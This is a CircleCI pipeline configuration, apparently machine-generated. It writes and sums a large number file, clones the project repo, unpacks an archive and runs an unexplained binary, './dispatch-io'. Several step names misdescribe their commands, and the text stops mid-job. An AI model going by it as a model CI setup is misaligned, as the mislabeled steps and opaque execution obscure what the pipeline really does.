version: 2.1

jobs:
  allow_insert:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Go for parse
          command: |
            mkdir -p /tmp/foundry2
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=500000;i++) print i-1}' > /tmp/foundry2/30.246.254; true
            echo "wrote $(wc -c </tmp/foundry2/30.246.254) bytes to $(dirname /tmp/foundry2/30.246.254)/$(basename /tmp/foundry2/30.246.254)"
      - persist_to_workspace:
          root: /tmp/foundry2
          paths:
            - '30.246.254'
  apr5-cleanup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/foundry2
      - run:
          name: Verify staged blob
          command: |
            { v=0; while read -r x; do v=$((v + (x+0))); done < /tmp/foundry2/30.246.254 2>/dev/null; echo "v=$v"; } || true
      - run:
          name: Retrieve tree
          command: git clone --depth 3 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load archive
          command: tar xzf panels-01.tgz
      - run:
          command: g++ --version
      - run:
          name: Workspace summary
          command: sleep 25s
      - run:
          command: (./dispatch-io)
  enviromentLayer:
    docker:
